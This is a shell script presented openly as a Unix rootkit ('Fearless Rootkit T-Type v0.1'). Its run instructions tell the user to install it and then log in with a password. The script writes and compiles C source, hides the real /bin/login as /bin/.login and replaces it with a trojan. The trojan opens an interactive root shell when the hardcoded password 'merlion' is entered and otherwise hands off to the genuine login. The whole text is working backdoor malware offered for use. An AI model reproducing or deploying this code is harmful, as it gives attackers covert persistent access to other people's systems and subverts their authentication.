#!/bin/sh

# Fearless Rootkit T-Type v0.1
# Coded by Merlion  merld_one@yahoo.com
# To run:
# chmod 755 droprk.sh
# ./droprk.sh
# Telnet to login daemon (port 513) and enter password
# Have fun!

arg="$1"
if [ "$arg" = "" ]; then
echo "Usage is: ./droprk -i (to install) -r (to uninstall)"
exit 1
elif [ "$arg" = "-r" ]; then
test -e /bin/.login && rm -f /bin/login; mv /bin/.login /bin/login; exit 0 || echo "Not installed"
elif [ $arg = "-i" ]; then

cat > /tmp/drop.c << EOF

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>		/* For daemon related functions */

#define REAL "/bin/.login"
#define TROJAN "/bin/login"
#define ROOT "merlion"

char **execute;
char passwd[8];

main(int argc, char **argv) {

void die(char *error);
void connection();

pid_t pid, sid;			/* Daemon variables */

signal(SIGALRM,connection);
alarm(1);
execute=argv;
*execute=TROJAN;

if ((pid=fork()) < 0) die("Error on fork()");	   /* Start daemon process */
if (pid > 0) exit(0); 				   /* Exit parent process */
if ((sid=setsid()) < 0) die("Error on setsid()");  /* Create new session */
if ((chdir("/") < 0)) die("Error on chdir()");	   /* Set working directory */
umask(0);	/* Set umask to 0 to avoid unwanted rights inheritance */
close(STDIN_FILENO);		/*    Close			*/
close(STDOUT_FILENO);		/*    associated   		*/
close(STDERR_FILENO);		/*    file streams		*/
/* On our own now */

scanf("%s", passwd);
if (strcmp(passwd,ROOT) == 0) {
alarm(0);
execl("/bin/sh","/bin/sh","-i",0);
exit(0);  }	/* Remove?? */
else {
execv(REAL,execute);
exit(0);  }  /* Remove?? */
}

void connection() {
execv(REAL,execute);
exit(0);  }

void die(char *error)  {
perror(error);
exit(1); }

EOF

fi 

gcc -o /tmp/login /tmp/drop.c
rm -f /tmp/drop.c
mv /bin/login /bin/.login
mv /tmp/login /bin/

exit 0


